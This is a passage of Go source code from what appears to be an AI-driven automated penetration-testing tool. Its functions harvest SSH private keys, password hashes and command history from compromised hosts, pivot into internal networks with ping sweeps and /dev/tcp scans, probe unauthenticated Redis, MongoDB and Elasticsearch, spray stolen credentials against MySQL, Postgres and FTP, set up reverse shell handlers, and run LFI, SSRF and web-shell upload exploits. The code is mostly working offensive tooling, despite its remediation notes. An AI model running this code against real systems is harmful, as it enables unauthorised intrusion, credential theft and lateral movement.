		{"cat ~/.ssh/known_hosts 2>/dev/null | head -20 || echo 'No known_hosts'", "SSH Known Hosts"},
		{"cat /etc/hosts", "Network Hosts"},
		{"netstat -tulpn 2>/dev/null || ss -tulpn", "Listening Services"},
		{"ps aux | head -20", "Running Processes"},
		{"cat /etc/crontab 2>/dev/null", "Scheduled Tasks"},
		{"find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null", "All SSH/Private Keys Found"},
		{"find /root -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null || echo 'No access to /root'", "Root SSH Keys"},
		{"cat ~/.bash_history 2>/dev/null | head -30", "Command History"},
		{"env | grep -i pass || echo 'No password in env'", "Environment Variables"},
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n=== POST-EXPLOITATION RECON ON %s:%s as %s ===\n\n", target, port, username))

	var extractedKeys []string
	var extractedHashes []string

	for _, recon := range reconCommands {
		module.SetOption("CMD", recon.cmd)
		result, err := module.Run(ctx)

		sb.WriteString(fmt.Sprintf("--- %s ---\n", recon.desc))
		if err != nil {
			sb.WriteString(fmt.Sprintf("Error: %v\n", err))
		} else if result.Output != "" {
			sb.WriteString(result.Output)
			sb.WriteString("\n")

			// Extract SSH private keys for customer proof
			if strings.Contains(recon.desc, "SSH Private Keys") && strings.Contains(result.Output, "BEGIN") {
				extractedKeys = append(extractedKeys, result.Output)
				sb.WriteString("\n[!] CRITICAL: SSH PRIVATE KEY EXTRACTED - Full access possible!\n")
			}

			// Extract shadow hashes if found
			if strings.Contains(recon.desc, "Password Hashes") && strings.Contains(result.Output, "$") {
				lines := strings.Split(result.Output, "\n")
				for _, line := range lines {
					if strings.Contains(line, "$") && strings.Contains(line, ":") {
						parts := strings.Split(line, ":")
						if len(parts) >= 2 {
							extractedHashes = append(extractedHashes, line)
						}
					}
				}
				if len(extractedHashes) > 0 {
					sb.WriteString("\n[!] CRITICAL: PASSWORD HASHES EXTRACTED FROM /etc/shadow!\n")
				}
			}
		} else {
			sb.WriteString("(no output)\n")
		}
		sb.WriteString("\n")
	}

	// Store extracted keys as credentials for the report
	if len(extractedKeys) > 0 {
		for i, key := range extractedKeys {
			r.state.Credentials = append(r.state.Credentials, CredentialFind{
				Username: fmt.Sprintf("ssh_private_key_%d", i+1),
				Password: key,
				Service:  "ssh_key_extracted",
				Target:   fmt.Sprintf("%s:%s", target, port),
			})
		}
	}

	// Store extracted shadow hashes
	for _, hash := range extractedHashes {
		parts := strings.Split(hash, ":")
		if len(parts) >= 2 {
			r.state.Credentials = append(r.state.Credentials, CredentialFind{
				Username: parts[0],
				Hash:     parts[1],
				Service:  "shadow_hash",
				Target:   fmt.Sprintf("%s:%s", target, port),
			})
		}
	}

	// Add critical finding
	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
		Type:        "ssh_compromise",
		Severity:    "critical",
		Target:      fmt.Sprintf("%s:%s", target, port),
		Description: fmt.Sprintf("Full SSH access gained as '%s' - system reconnaissance completed", username),
		Evidence:    sb.String(),
		Remediation: "Change compromised password, review SSH authentication settings, implement key-based auth",
		Timestamp:   time.Now(),
	})

	// Add session
	r.state.Sessions = append(r.state.Sessions, SessionInfo{
		ID:       fmt.Sprintf("ssh-recon-%d", len(r.state.Sessions)+1),
		Type:     "ssh",
		Target:   fmt.Sprintf("%s:%s", target, port),
		User:     username,
		Platform: "linux",
	})

	if r.callbacks.OnFinding != nil {
		r.callbacks.OnFinding(Finding{
			Type:        "ssh_compromise",
			Severity:    "critical",
			Target:      fmt.Sprintf("%s:%s", target, port),
			Description: fmt.Sprintf("SSH shell obtained as %s - recon completed", username),
		})
	}

	action.Result = sb.String()
	action.Success = true
	action.Data["username"] = username
	action.Data["recon_output"] = sb.String()

	return action, nil
}

// actionSSHPivot uses SSH access to discover internal networks and hosts
func (r *AutoRunner) actionSSHPivot(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	// Parse target
	target := decision.Target
	port := "22"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	// Find SSH credentials from state
	var username, password string
	targetKey := fmt.Sprintf("%s:%s", target, port)
	for _, cred := range r.state.Credentials {
		if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == target || strings.HasPrefix(cred.Target, target)) {
			username = cred.Username
			password = cred.Password
			break
		}
	}

	if username == "" || password == "" {
		action.Result = "SSH pivot requires credentials - run ssh_login first"
		action.Success = false
		return action, nil
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n=== SSH PIVOT SCAN FROM %s:%s as %s ===\n\n", target, port, username))

	// Commands to discover internal networks and hosts
	pivotCommands := []struct {
		cmd  string
		desc string
	}{
		{"ip addr show 2>/dev/null || ifconfig", "Network Interfaces"},
		{"ip route show 2>/dev/null || route -n", "Routing Table"},
		{"cat /etc/resolv.conf 2>/dev/null", "DNS Configuration"},
		{"arp -a 2>/dev/null || ip neigh show", "ARP Cache (nearby hosts)"},
		{"cat /etc/hosts", "Hosts File"},
		{"ss -tulpn 2>/dev/null || netstat -tulpn", "Listening Services"},
		// Scan common internal subnets for live hosts
		{"for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.1.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null | head -20", "192.168.1.0/24 Live Hosts"},
		{"for i in $(seq 1 254); do (ping -c 1 -W 1 10.0.0.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null | head -20", "10.0.0.0/24 Live Hosts"},
		{"for i in $(seq 1 20); do (ping -c 1 -W 1 172.17.0.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null", "Docker Network (172.17.0.0/24)"},
		// Check for common internal services
		{"(echo > /dev/tcp/172.17.0.1/22 2>/dev/null && echo '172.17.0.1:22 OPEN') || echo '172.17.0.1:22 closed'", "Docker Host SSH"},
		{"(echo > /dev/tcp/172.17.0.1/3306 2>/dev/null && echo '172.17.0.1:3306 OPEN') || echo '172.17.0.1:3306 closed'", "Docker Host MySQL"},
		// Find other Docker containers
		{"cat /etc/hostname", "Container Hostname"},
		{"cat /proc/1/cgroup 2>/dev/null | head -5", "Container Detection"},
		{"env | grep -i docker || env | grep -i kube || echo 'No container env vars'", "Container Environment"},
	}

	// Execute via SSH
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	module.SetOption("USERNAME", username)
	module.SetOption("PASSWORD", password)

	var discoveredHosts []string
	var discoveredNetworks []string

	for _, cmd := range pivotCommands {
		module.SetOption("CMD", cmd.cmd)
		result, err := module.Run(ctx)

		sb.WriteString(fmt.Sprintf("--- %s ---\n", cmd.desc))
		if err != nil {
			sb.WriteString(fmt.Sprintf("Error: %v\n", err))
		} else if result.Output != "" {
			sb.WriteString(result.Output)
			sb.WriteString("\n")

			// Parse discovered networks
			if strings.Contains(cmd.desc, "Network Interfaces") || strings.Contains(cmd.desc, "Routing") {
				lines := strings.Split(result.Output, "\n")
				for _, line := range lines {
					// Look for IP addresses
					if strings.Contains(line, "inet ") || strings.Contains(line, "inet6") {
						parts := strings.Fields(line)
						for _, part := range parts {
							if strings.Contains(part, ".") && !strings.HasPrefix(part, "127.") {
								discoveredNetworks = append(discoveredNetworks, part)
							}
						}
					}
				}
			}

			// Parse discovered hosts
			if strings.Contains(cmd.desc, "Live Hosts") || strings.Contains(cmd.desc, "ARP") {
				lines := strings.Split(result.Output, "\n")
				for _, line := range lines {
					if strings.Contains(line, "bytes from") || strings.Contains(line, "OPEN") {
						// Extract IP from ping output
						parts := strings.Fields(line)
						for _, part := range parts {
							part = strings.Trim(part, "():")
							if strings.Count(part, ".") == 3 && !strings.HasPrefix(part, "127.") {
								discoveredHosts = append(discoveredHosts, part)
							}
						}
					}
				}
			}
		}
		sb.WriteString("\n")
	}

	// Summary
	sb.WriteString("\n=== PIVOT DISCOVERY SUMMARY ===\n")
	if len(discoveredNetworks) > 0 {
		sb.WriteString(fmt.Sprintf("Networks Found: %v\n", discoveredNetworks))
	}
	if len(discoveredHosts) > 0 {
		sb.WriteString(fmt.Sprintf("Live Hosts Found: %v\n", discoveredHosts))
		sb.WriteString("\n[!] These hosts can be targeted for further exploitation!\n")
	}

	// Add discovered hosts to state for further scanning
	for _, host := range discoveredHosts {
		// Check if already in state
		found := false
		for _, h := range r.state.DiscoveredHosts {
			if h.IP == host {
				found = true
				break
			}
		}
		if !found {
			r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
				IP:     host,
				Status: "pivot_discovered",
			})
		}
	}

	// Add finding
	if len(discoveredHosts) > 0 || len(discoveredNetworks) > 0 {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "internal_network_discovery",
			Severity:    "high",
			Target:      fmt.Sprintf("%s:%s", target, port),
			Description: fmt.Sprintf("SSH pivot revealed %d internal networks and %d live hosts", len(discoveredNetworks), len(discoveredHosts)),
			Evidence:    fmt.Sprintf("Networks: %v\nHosts: %v", discoveredNetworks, discoveredHosts),
			Remediation: "Implement network segmentation, restrict SSH access, use bastion hosts",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "internal_network_discovery",
				Severity:    "high",
				Target:      fmt.Sprintf("%s:%s", target, port),
				Description: fmt.Sprintf("Pivot scan found %d hosts via SSH", len(discoveredHosts)),
			})
		}
	}

	action.Result = sb.String()
	action.Success = len(discoveredHosts) > 0 || len(discoveredNetworks) > 0
	action.Data["discovered_hosts"] = discoveredHosts
	action.Data["discovered_networks"] = discoveredNetworks
	action.Data["pivot_host"] = target
	action.Data["pivot_port"] = port

	return action, nil
}

// actionPivotScan performs deep port scanning on discovered internal hosts via SSH
func (r *AutoRunner) actionPivotScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	// Get pivot host and target internal host from decision
	// Format: pivot_scan internal_ip via pivot_host:port
	// Or use discovered hosts from state

	// Find SSH credentials and pivot info from previous ssh_pivot action
	var pivotHost, pivotPort, pivotUser, pivotPass string
	for i := len(r.state.ActionHistory) - 1; i >= 0; i-- {
		hist := r.state.ActionHistory[i]
		if hist.Type == "ssh_pivot" && hist.Success {
			if h, ok := hist.Data["pivot_host"].(string); ok {
				pivotHost = h
			}
			if p, ok := hist.Data["pivot_port"].(string); ok {
				pivotPort = p
			}
			break
		}
	}

	// Get SSH credentials
	targetKey := fmt.Sprintf("%s:%s", pivotHost, pivotPort)
	for _, cred := range r.state.Credentials {
		if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == pivotHost || strings.HasPrefix(cred.Target, pivotHost)) {
			pivotUser = cred.Username
			pivotPass = cred.Password
			break
		}
	}

	if pivotHost == "" || pivotUser == "" {
		action.Result = "No pivot host or credentials available - run ssh_pivot first"
		action.Success = false
		return action, nil
	}

	// Get internal hosts to scan
	var internalHosts []string
	for _, host := range r.state.DiscoveredHosts {
		if host.Status == "pivot_discovered" {
			internalHosts = append(internalHosts, host.IP)
		}
	}

	if len(internalHosts) == 0 {
		action.Result = "No internal hosts discovered - run ssh_pivot first"
		action.Success = false
		return action, nil
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n=== DEEP SCAN OF INTERNAL HOSTS VIA %s ===\n\n", pivotHost))

	// Set up SSH module
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", pivotHost)
	module.SetOption("RPORT", pivotPort)
	module.SetOption("USERNAME", pivotUser)
	module.SetOption("PASSWORD", pivotPass)

	// Common ports to scan on internal hosts
	commonPorts := []int{22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017, 9200, 5000, 3000, 21, 25, 53, 139, 445, 1433, 5900}

	totalFindings := 0
	for _, internalHost := range internalHosts {
		sb.WriteString(fmt.Sprintf("\n--- Scanning %s ---\n", internalHost))

		// Quick TCP scan using bash
		scanCmd := fmt.Sprintf(`for port in %s; do (echo > /dev/tcp/%s/$port 2>/dev/null && echo "$port OPEN") & done; wait 2>/dev/null`,
			portsToString(commonPorts), internalHost)

		module.SetOption("CMD", scanCmd)
		result, err := module.Run(ctx)

		if err != nil {
			sb.WriteString(fmt.Sprintf("Scan error: %v\n", err))
			continue
		}

		openPorts := []int{}
		if result.Output != "" {
			lines := strings.Split(result.Output, "\n")
			for _, line := range lines {
				if strings.Contains(line, "OPEN") {
					parts := strings.Fields(line)
					if len(parts) > 0 {
						if port, err := strconv.Atoi(parts[0]); err == nil {
							openPorts = append(openPorts, port)
							sb.WriteString(fmt.Sprintf("  [+] Port %d OPEN\n", port))
						}
					}
				}
			}
		}

		if len(openPorts) == 0 {
			sb.WriteString("  No open ports found on common ports\n")
			continue
		}

		// Service identification on open ports
		for _, port := range openPorts {
			// Try to grab banner
			bannerCmd := fmt.Sprintf(`timeout 2 bash -c 'exec 3<>/dev/tcp/%s/%d; echo -e "HEAD / HTTP/1.0\r\n\r\n" >&3; cat <&3' 2>/dev/null | head -5`, internalHost, port)
			module.SetOption("CMD", bannerCmd)
			bannerResult, _ := module.Run(ctx)

			serviceName := identifyServiceByPort(port)
			banner := ""
			if bannerResult != nil && bannerResult.Output != "" {
				banner = strings.TrimSpace(bannerResult.Output)
				if len(banner) > 100 {
					banner = banner[:100] + "..."
				}
			}

			sb.WriteString(fmt.Sprintf("  [*] %d/%s", port, serviceName))
			if banner != "" {
				sb.WriteString(fmt.Sprintf(" - %s", banner))
			}
			sb.WriteString("\n")

			// Add to state as discovered service
			r.state.Services = append(r.state.Services, ServiceInfo{
				Host:   internalHost,
				Port:   port,
				Name:   serviceName,
				Banner: banner,
			})

			// Add open port to state
			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
				Host:     internalHost,
				Port:     port,
				Protocol: "tcp",
				State:    "open",
			})
		}

		// Add vulnerability finding for each internal host with services
		if len(openPorts) > 0 {
			totalFindings++
			finding := Finding{
				Type:        "internal_host_services",
				Severity:    "high",
				Target:      internalHost,
				Description: fmt.Sprintf("Internal host %s has %d open ports accessible via pivot", internalHost, len(openPorts)),
				Evidence:    fmt.Sprintf("Open ports: %v", openPorts),
				Remediation: "Implement network segmentation, firewall rules between network segments",
				Timestamp:   time.Now(),
			}
			r.state.Vulnerabilities = append(r.state.Vulnerabilities, finding)

			if r.callbacks.OnFinding != nil {
				r.callbacks.OnFinding(finding)
			}

			// Update host status
			for i, h := range r.state.DiscoveredHosts {
				if h.IP == internalHost {
					r.state.DiscoveredHosts[i].Status = "scanned"
					break
				}
			}
		}

		// Quick vulnerability checks on interesting ports
		for _, port := range openPorts {
			switch port {
			case 6379: // Redis
				redisCmd := fmt.Sprintf(`echo "INFO" | timeout 2 nc %s %d 2>/dev/null | head -10`, internalHost, port)
				module.SetOption("CMD", redisCmd)
				redisResult, _ := module.Run(ctx)
				if redisResult != nil && strings.Contains(redisResult.Output, "redis_version") {
					sb.WriteString(fmt.Sprintf("  [!] CRITICAL: Redis on %s:%d - NO AUTH REQUIRED!\n", internalHost, port))
					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
						Type:        "internal_redis_unauth",
						Severity:    "critical",
						Target:      fmt.Sprintf("%s:%d", internalHost, port),
						Description: "Internal Redis instance has no authentication",
						Remediation: "Enable Redis authentication with requirepass",
						Timestamp:   time.Now(),
					})
					if r.callbacks.OnFinding != nil {
						r.callbacks.OnFinding(Finding{
							Type:     "internal_redis_unauth",
							Severity: "critical",
							Target:   fmt.Sprintf("%s:%d", internalHost, port),
						})
					}
				}

			case 27017: // MongoDB
				mongoCmd := fmt.Sprintf(`echo 'db.adminCommand({listDatabases:1})' | timeout 2 nc %s %d 2>/dev/null`, internalHost, port)
				module.SetOption("CMD", mongoCmd)
				mongoResult, _ := module.Run(ctx)
				if mongoResult != nil && (strings.Contains(mongoResult.Output, "databases") || strings.Contains(mongoResult.Output, "admin")) {
					sb.WriteString(fmt.Sprintf("  [!] CRITICAL: MongoDB on %s:%d - NO AUTH REQUIRED!\n", internalHost, port))
					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
						Type:        "internal_mongodb_unauth",
						Severity:    "critical",
						Target:      fmt.Sprintf("%s:%d", internalHost, port),
						Description: "Internal MongoDB instance has no authentication",
						Remediation: "Enable MongoDB authentication",
						Timestamp:   time.Now(),
					})
				}

			case 9200: // Elasticsearch
				esCmd := fmt.Sprintf(`curl -s --connect-timeout 2 http://%s:%d/ 2>/dev/null | head -20`, internalHost, port)
				module.SetOption("CMD", esCmd)
				esResult, _ := module.Run(ctx)
				if esResult != nil && strings.Contains(esResult.Output, "cluster_name") {
					sb.WriteString(fmt.Sprintf("  [!] HIGH: Elasticsearch on %s:%d - Exposed!\n", internalHost, port))
					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
						Type:        "internal_elasticsearch_exposed",
						Severity:    "high",
						Target:      fmt.Sprintf("%s:%d", internalHost, port),
						Description: "Internal Elasticsearch instance is accessible",
						Remediation: "Enable X-Pack security or restrict network access",
						Timestamp:   time.Now(),
					})
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n=== PIVOT SCAN COMPLETE: %d hosts scanned, %d with services ===\n", len(internalHosts), totalFindings))

	action.Result = sb.String()
	action.Success = totalFindings > 0

	return action, nil
}

// portsToString converts port slice to space-separated string
func portsToString(ports []int) string {
	var parts []string
	for _, p := range ports {
		parts = append(parts, strconv.Itoa(p))
	}
	return strings.Join(parts, " ")
}

// identifyServiceByPort returns common service name for port
func identifyServiceByPort(port int) string {
	services := map[int]string{
		21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
		80: "http", 110: "pop3", 139: "netbios", 143: "imap", 443: "https",
		445: "smb", 1433: "mssql", 1521: "oracle", 3306: "mysql",
		3389: "rdp", 5432: "postgresql", 5900: "vnc", 6379: "redis",
		8080: "http-proxy", 8443: "https-alt", 9200: "elasticsearch",
		27017: "mongodb", 5000: "flask", 3000: "nodejs",
	}
	if name, ok := services[port]; ok {
		return name
	}
	return "unknown"
}

// actionReverseShell generates reverse shell payloads for all supported shell types
func (r *AutoRunner) actionReverseShell(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/handler"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Get LHOST and LPORT from options
	lhost := getOpt(decision.Options, "lhost")
	lport := getOpt(decision.Options, "lport")

	if lhost == "" {
		lhost = "127.0.0.1" // Default to localhost
	}
	if lport == "" {
		lport = "4444" // Default port
	}

	module.SetOption("LHOST", lhost)
	module.SetOption("LPORT", lport)
	module.SetOption("RHOSTS", decision.Target)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Reverse shell generation failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add finding about available reverse shell payloads
	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
		Type:        "reverse_shell_ready",
		Severity:    "info",
		Target:      decision.Target,
		Description: fmt.Sprintf("Reverse shell payloads generated for %s:%s", lhost, lport),
		Evidence:    result.Output,
		Remediation: "These payloads can be used with command injection vulnerabilities",
		Timestamp:   time.Now(),
	})

	action.Result = result.Output
	action.Success = result.Success
	action.Data["lhost"] = lhost
	action.Data["lport"] = lport
	action.Data["payloads"] = result.Data["payloads"]

	return action, nil
}

// actionCredSpray tries credentials on various services (FTP, MySQL, HTTP, Redis)
func (r *AutoRunner) actionCredSpray(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	// Get target IP
	target := decision.Target
	if strings.Contains(target, ":") {
		target = strings.Split(target, ":")[0]
	}
	if target == "" {
		target = r.state.Target
	}

	// Collect all unique username:password pairs from discovered credentials
	type credPair struct{ username, password string }
	credSet := make(map[credPair]bool)
	for _, cred := range r.state.Credentials {
		if cred.Username != "" && cred.Password != "" {
			credSet[credPair{cred.Username, cred.Password}] = true
		}
	}

	if len(credSet) == 0 {
		action.Result = "No credentials found to spray - discover credentials first via ssh_login, web exploits, etc."
		action.Success = false
		return action, nil
	}

	// Define services to spray against
	services := []struct {
		name string
		port int
	}{
		{"mysql", 3306},
		{"postgres", 5432},
		{"ftp", 21},
	}

	var results strings.Builder
	results.WriteString(fmt.Sprintf("[*] Credential spray on %s\n", target))
	results.WriteString(fmt.Sprintf("[*] Testing %d credential pairs against %d services\n\n", len(credSet), len(services)))

	foundCount := 0

	for cred := range credSet {
		for _, svc := range services {
			// Check if this port is open
			portOpen := false
			for _, p := range r.state.OpenPorts {
				if p.Port == svc.port {
					portOpen = true
					break
				}
			}
			if !portOpen {
				continue
			}

			// Skip if we already have this credential for this service
			alreadyFound := false
			for _, existing := range r.state.Credentials {
				if existing.Service == svc.name && existing.Username == cred.username {
					alreadyFound = true
					break
				}
			}
			if alreadyFound {
				continue
			}

			results.WriteString(fmt.Sprintf("[>] Trying %s:%s on %s:%d...", cred.username, cred.password, svc.name, svc.port))

			success := false
			switch svc.name {
			case "mysql":
				success = r.tryMySQLCreds(target, svc.port, cred.username, cred.password)
			case "postgres":
				success = r.tryPostgresCreds(target, svc.port, cred.username, cred.password)
			case "ftp":
				success = r.tryFTPCreds(target, svc.port, cred.username, cred.password)
			}

			if success {
				foundCount++
				results.WriteString(" [SUCCESS!]\n")

				// Add credential
				cf := CredentialFind{
					Username: cred.username,
					Password: cred.password,
					Service:  svc.name,
					Target:   fmt.Sprintf("%s:%d", target, svc.port),
				}
				r.state.Credentials = append(r.state.Credentials, cf)

				if r.callbacks.OnCredential != nil {
					r.callbacks.OnCredential(cf)
				}

				// Add finding
				finding := Finding{
					Type:        "credential_reuse",
					Severity:    "high",
					Target:      fmt.Sprintf("%s:%d", target, svc.port),
					Service:     svc.name,
					Description: fmt.Sprintf("Password reuse: %s credentials work on %s", cred.username, svc.name),
					Remediation: "Use unique passwords for each service",
					Timestamp:   time.Now(),
				}
				r.state.Vulnerabilities = append(r.state.Vulnerabilities, finding)

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(finding)
				}
			} else {
				results.WriteString(" [failed]\n")
			}
		}
	}

	if foundCount > 0 {
		results.WriteString(fmt.Sprintf("\n[+] Credential spray complete: %d successful logins!\n", foundCount))
		action.Success = true
	} else {
		results.WriteString("\n[-] Credential spray complete: no successful logins\n")
		action.Success = false
	}

	action.Result = results.String()
	return action, nil
}

// Helper functions for credential testing
func (r *AutoRunner) tryMySQLCreds(host string, port int, user, pass string) bool {
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/", user, pass, host, port)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return false
	}
	defer db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return db.PingContext(ctx) == nil
}

func (r *AutoRunner) tryPostgresCreds(host string, port int, user, pass string) bool {
	connStr := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=postgres sslmode=disable connect_timeout=5", host, port, user, pass)
	db, err := sql.Open("postgres", connStr)
	if err != nil {
		return false
	}
	defer db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return db.PingContext(ctx) == nil
}

func (r *AutoRunner) tryFTPCreds(host string, port int, user, pass string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	reader := bufio.NewReader(conn)

	// Read banner
	reader.ReadString('\n')

	// Send USER
	fmt.Fprintf(conn, "USER %s\r\n", user)
	resp, _ := reader.ReadString('\n')
	if !strings.HasPrefix(resp, "331") {
		return false
	}

	// Send PASS
	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	resp, _ = reader.ReadString('\n')
	return strings.HasPrefix(resp, "230")
}


// actionLFI tests for Local File Inclusion vulnerabilities
func (r *AutoRunner) actionLFI(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/lfi"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("LFI exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "local_file_inclusion",
			Severity:    "high",
			Target:      decision.Target,
			Description: "Local File Inclusion - Sensitive files readable",
			Evidence:    result.Output,
			Remediation: "Validate and sanitize file path inputs, use allowlists for includable files",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "local_file_inclusion",
				Severity:    "high",
				Target:      decision.Target,
				Description: "LFI vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSSRF tests for Server-Side Request Forgery vulnerabilities
func (r *AutoRunner) actionSSRF(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/ssrf"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSRF exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "ssrf",
			Severity:    "high",
			Target:      decision.Target,
			Description: "Server-Side Request Forgery - Internal services accessible",
			Evidence:    result.Output,
			Remediation: "Validate and sanitize URLs, implement allowlists, block internal IP ranges",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "ssrf",
				Severity:    "high",
				Target:      decision.Target,
				Description: "SSRF vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionFileUpload tests for insecure file upload vulnerabilities
func (r *AutoRunner) actionFileUpload(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/file_upload"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if uploadDir := getOpt(decision.Options, "uploaddir"); uploadDir != "" {
		module.SetOption("UPLOADDIR", uploadDir)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("File upload exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "file_upload_rce",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "Insecure File Upload - Web shell uploaded, RCE achieved",
			Evidence:    result.Output,
			Remediation: "Validate file types, use allowlists, store uploads outside webroot, rename files",
			Timestamp:   time.Now(),
		})

		// Add session for RCE
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("webshell-%d", len(r.state.Sessions)+1),
			Type:   "webshell",
			Target: decision.Target,
			User:   "www-data",
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
